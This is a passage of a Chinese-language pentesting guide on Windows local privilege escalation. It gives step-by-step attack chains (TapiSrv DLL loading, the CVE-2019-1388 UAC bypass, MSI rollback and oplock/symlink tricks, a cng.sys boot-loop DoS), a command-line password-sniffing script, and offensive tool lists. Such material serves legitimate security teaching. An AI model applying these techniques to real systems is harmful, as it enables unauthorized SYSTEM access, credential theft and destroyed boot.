Telephony 服务 (TapiSrv) 在 server 模式下会暴露 `\\pipe\\tapsrv` (MS-TRP)。远程已认证的客户端可以滥用基于 mailslot 的异步事件路径，将 `ClientAttach` 转换为对任何由 `NETWORK SERVICE` 可写的现有文件的任意 **4-byte write**，随后获得 Telephony 管理权限并以服务身份加载任意 DLL。完整流程：

- 将 `ClientAttach` 的 `pszDomainUser` 设置为一个可写的现有路径 → 服务通过 `CreateFileW(..., OPEN_EXISTING)` 打开该路径并将其用于异步事件写入。
- 每个事件都会将来自 `Initialize` 的攻击者可控的 `InitContext` 写入该句柄。使用 `LRegisterRequestRecipient`（`Req_Func 61`）注册 line app，触发 `TRequestMakeCall`（`Req_Func 121`），通过 `GetAsyncEvents`（`Req_Func 0`）获取，然后注销/关闭以重复确定性写入。
- 将自己添加到 `C:\Windows\TAPI\tsec.ini` 中的 `[TapiAdministrators]`，重新连接，然后使用任意 DLL 路径调用 `GetUIDllName` 以作为 `NETWORK SERVICE` 执行 `TSPI_providerUIIdentify`。

更多细节：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

查看页面 **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

可点击的 Markdown 链接如果转发到 `ShellExecuteExW`，可能触发危险的 URI 处理程序（`file:`、`ms-appinstaller:` 或任何已注册的 scheme），并以当前用户身份执行攻击者控制的文件。参见：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

在以用户身份获得 shell 时，可能有计划任务或其他正在执行的进程会 **在命令行上传递凭据**。下面的脚本每两秒捕获一次进程命令行并将当前状态与先前状态比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程中窃取密码

## 从低权限用户提升到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过控制台或 RDP）且启用了 UAC，在某些版本的 Microsoft Windows 中，可以让非特权用户运行一个终端或任何其他进程，例如 "NT\AUTHORITY SYSTEM"。

这使得可以利用同一漏洞同时提升权限并绕过 UAC。此外，无需安装任何东西，过程中使用的二进制文件是由 Microsoft 签名和发布的。

受影响的一些系统如下：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

阅读此文以 **learn about Integrity Levels**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后 **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

该攻击基本上是滥用 Windows Installer 的 rollback 功能，在卸载过程中将合法文件替换为恶意文件。为此，攻击者需要创建一个 **malicious MSI installer**，用于劫持 `C:\Config.Msi` 文件夹，Windows Installer 在卸载其他 MSI 包时会将 rollback 文件存放到该文件夹，后来这些 rollback 文件会被修改为包含恶意负载。

技术概要如下：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- 创建一个 `.msi`，在可写文件夹（`TARGETDIR`）中安装一个无害文件（例如 `dummy.txt`）。
- 将安装程序标记为 **"UAC Compliant"**，以便 **non-admin user** 可以运行它。
- 在安装后保持对该文件的 **handle** 打开。

- Step 2: Begin Uninstall
- 卸载同一个 `.msi`。
- 卸载过程会将文件移到 `C:\Config.Msi` 并将它们重命名为 `.rbf` 文件（rollback 备份）。
- 使用 `GetFinalPathNameByHandle` **轮询打开的文件句柄**，以检测文件何时变为 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
- `.msi` 包含一个 **custom uninstall action (`SyncOnRbfWritten`)**，它：
- 在 `.rbf` 被写入时发送信号。
- 然后在继续卸载之前 **等待** 另一个事件。

- Step 4: Block Deletion of `.rbf`
- 在接收到信号后，**以不带 `FILE_SHARE_DELETE` 的方式打开 `.rbf` 文件** —— 这会**阻止其被删除**。
- 然后 **回传信号**，使卸载可以完成。
- Windows Installer 无法删除该 `.rbf`，因为无法删除所有内容，**`C:\Config.Msi` 不会被移除**。

- Step 5: Manually Delete `.rbf`
- 你（攻击者）手动删除该 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 是空的**，可以被劫持。

> 此时，**触发 SYSTEM 级别的 arbitrary folder delete 漏洞** 来删除 `C:\Config.Msi`。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自行重建 `C:\Config.Msi` 文件夹。
- 设置**弱 DACLs**（例如 Everyone:F），并保持一个带有 `WRITE_DAC` 权限的句柄打开。

- Step 7: Run Another Install
- 再次安装该 `.msi`，并设置：
- `TARGETDIR`：可写位置。
- `ERROROUT`：触发强制失败的变量。
- 这次安装将再次触发 **rollback**，它会读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
- 使用 `ReadDirectoryChangesW` 监视 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 捕获其文件名。

- Step 9: Sync Before Rollback
- `.msi` 包含一个 **custom install action (`SyncBeforeRollback`)**，它：
- 在 `.rbs` 创建时发送事件信号。
- 然后在继续之前 **等待**。

- Step 10: Reapply Weak ACL
- 在收到 `.rbs created` 事件后：
- Windows Installer 会**重新应用强 ACLs** 到 `C:\Config.Msi`。
- 但由于你仍然保持一个带有 `WRITE_DAC` 的句柄打开，你可以再次**重新应用弱 ACLs**。

> ACLs 仅在 handle 打开时**强制执行**，因此你仍然可以写入该文件夹。

- Step 11: Drop Fake `.rbs` and `.rbf`
- 覆盖 `.rbs` 文件为一个**伪 rollback 脚本**，该脚本指示 Windows：
- 将你的 `.rbf` 文件（恶意 DLL）恢复到一个**受保护位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 写入你的伪 `.rbf`，其中包含 **malicious SYSTEM-level payload DLL**。

- Step 12: Trigger the Rollback
- 发送同步事件使安装程序继续。
- 一个配置为在已知点故意失败的 **type 19 custom action (`ErrorOut`)** 会触发安装失败。
- 这会导致 **rollback 开始**。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer：
- 读取你恶意的 `.rbs`。
- 将你的 `.rbf` DLL 复制到目标位置。
- 你现在在一个 **由 SYSTEM 加载的路径** 中拥有你的恶意 DLL。

- Final Step: Execute SYSTEM Code
- 运行一个受信任的 **auto-elevated binary**（例如 `osk.exe`）来加载被你劫持的 DLL。
- **Boom**：你的代码以 **SYSTEM** 身份执行。

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主要的 MSI rollback 技术（前述方法）假设你可以删除整个文件夹（例如 `C:\Config.Msi`）。但如果你的漏洞仅允许 **arbitrary file deletion** 呢？

你可以利用 **NTFS internals**：每个文件夹都有一个名为的隐藏替代数据流（alternate data stream）：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
此流存储该文件夹的 **索引元数据**。

所以，如果你 **删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS **会从文件系统中移除整个文件夹**。

你可以使用像以下这样的标准文件删除 APIs 来做到这一点：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是 *文件* 删除 API， 它 **会删除文件夹本身**。

### 从删除文件夹内容到 SYSTEM EoP
如果你的 primitive 不允许你删除任意文件/文件夹，但它**确实允许删除攻击者控制的文件夹的*内容***，那怎么办？

1. 步骤 1：设置诱饵文件夹和文件
- 创建：`C:\temp\folder1`
- 在其中：`C:\temp\folder1\file1.txt`

2. 步骤 2：在 `file1.txt` 上放置一个 **oplock**
- 当特权进程尝试删除 `file1.txt` 时，该 oplock **会暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 步骤 3: 触发 SYSTEM 进程 (例如 `SilentCleanup`)
- 该进程扫描文件夹 (例如 `%TEMP%`) 并尝试删除其内容。
- 当它到达 `file1.txt` 时，**oplock 触发** 并将控制权交给你的回调。

4. 步骤 4: 在 oplock 回调内 – 重定向删除

- 选项 A: 将 `file1.txt` 移动到其他位置
- 这会清空 `folder1`，而不会中断 oplock。
- 不要直接删除 `file1.txt` — 那样会过早释放 oplock。

- 选项 B: 将 `folder1` 转换为 **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C: 在 `\RPC Control` 中创建一个 **symlink**:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这针对存储文件夹元数据的 NTFS 内部流 — 删除它会删除该文件夹。

5. 第 5 步：释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**: `C:\Config.Msi` 被 SYSTEM 删除。

### 从任意文件夹创建到永久 DoS

利用一个原语，让你 **以 SYSTEM/admin 身份创建任意文件夹** —  即使 **你不能写入文件** 或 **设置弱权限**。

创建一个 **文件夹**（不是文件）其名称为 **关键 Windows 驱动**，例如：
```
C:\Windows\System32\cng.sys
```
- 此路径通常对应 `cng.sys` 内核模式驱动。
- 如果你 **预先将其创建为文件夹**，Windows 在启动时无法加载实际驱动。
- 然后，Windows 在启动时尝试加载 `cng.sys`。
- 它看到该文件夹，**无法解析出实际驱动**，并**崩溃或中止启动**。
- 在没有外部干预（例如启动修复或访问磁盘）的情况下，**没有回退**，也**无法恢复**。

### 从特权日志/备份路径 + OM symlinks 到 arbitrary file overwrite / boot DoS

当一个 **特权服务** 将日志/导出写入从 **可写配置** 读取的路径时，通过 **Object Manager symlinks + NTFS mount points** 重定向该路径，可以把特权写入转为任意覆盖（即使 **没有** SeCreateSymbolicLinkPrivilege）。

**Requirements**
- 存储目标路径的配置对攻击者可写（例如 `%ProgramData%\...\.ini`）。
- 能够创建到 `\RPC Control` 的挂载点和一个 OM file symlink（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- 一个会写入该路径的特权操作（日志、导出、报告）。

**Example chain**
1. 读取配置以获取特权日志目的地，例如在 `C:\ProgramData\ICONICS\IcoSetup64.ini` 中的 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 在不具备管理员权限的情况下重定向该路径：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 等待具有特权的组件写入日志（例如，管理员触发 "send test SMS"）。写入现在落在 `C:\Windows\System32\cng.sys`。  
4. 检查被覆盖的目标（hex/PE parser）以确认损坏；重启会迫使 Windows 加载被篡改的驱动路径 → **boot loop DoS**。这也可以推广到任何特权服务将以写入方式打开的受保护文件。

> `cng.sys` 通常从 `C:\Windows\System32\drivers\cng.sys` 加载，但如果在 `C:\Windows\System32\cng.sys` 存在副本，系统可能会优先尝试它，从而使其成为一个可靠的 DoS 汇点来容纳损坏数据。



## **从 High Integrity 到 SYSTEM**

### **新服务**

如果你已经在 High Integrity 进程中运行，**通往 SYSTEM 的路径** 可以很容易地通过 **创建并执行一个新服务** 来实现：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 创建服务二进制文件时，确保它是一个有效的 service，或者二进制执行必要的 service 操作，因为如果不是有效的 service，它会在 20s 内被终止。

### AlwaysInstallElevated

从 High Integrity 进程你可以尝试**启用 AlwaysInstallElevated 注册表项**并使用 _**.msi**_ 包装器**安装**一个 reverse shell。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有这些 token 特权（很可能在已是 High Integrity 进程中会发现），你将能够使用 SeDebug 权限**打开几乎任何 process**（非受保护 process），**复制该 process 的 token**，并用该 token **创建任意 process**。\
使用该技术通常会**选择以 SYSTEM 运行且拥有所有 token 特权的任意 process**（_是的，你可以找到没有所有 token 特权的 SYSTEM 进程_）。\
**你可以找到一个** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

此技术被 meterpreter 用于在 `getsystem` 中提升权限。该技术包括**创建一个 pipe 然后创建/滥用一个 service 向该 pipe 写入**。随后，使用 **`SeImpersonate`** 权限创建该 pipe 的 **server** 将能够**模拟 pipe 客户端（即 service）的 token**，从而获得 SYSTEM 权限。\
如果你想要 [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)。\
如果你想阅读一个 [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md) 的示例。

### Dll Hijacking

如果你能劫持被以 **SYSTEM** 身份运行的 **process** 所加载的 **dll**，你就能够以该权限执行任意代码。因此 Dll Hijacking 对此类提权也很有用，而且从 high integrity 进程实现要容易得多，因为它对用于加载 dll 的文件夹拥有**写权限**。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**用于查找 Windows 本地提权向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查错误配置和敏感文件（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。已检测。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的错误配置并收集信息（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查错误配置**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的会话信息。在本地使用 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 提取凭据。已检测。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域内对收集到的密码进行喷洒**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS 欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的 Windows 提权枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~ -- 搜索已知的提权漏洞（已被 Watson 取代）~~**\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(需要 Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的提权漏洞（需要使用 VisualStudio 编译）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找错误配置（更多为信息收集工具而非纯提权）（需要编译）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量软件中提取凭据（github 上有预编译的 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- 将 PowerUp 移植到 C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~ -- 检查错误配置（github 上有预编译可执行文件）。不推荐。在 Win10 上效果不佳。~~**\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的错误配置（通过 python 生成的 exe）。不推荐。在 Win10 上效果不佳。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于此帖创建的工具（不需要 accesschk 即可正常工作，但可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用 exploit（本地 python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用 exploit（本地 python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确版本的 .NET 来编译该项目（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上已安装的 .NET 版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
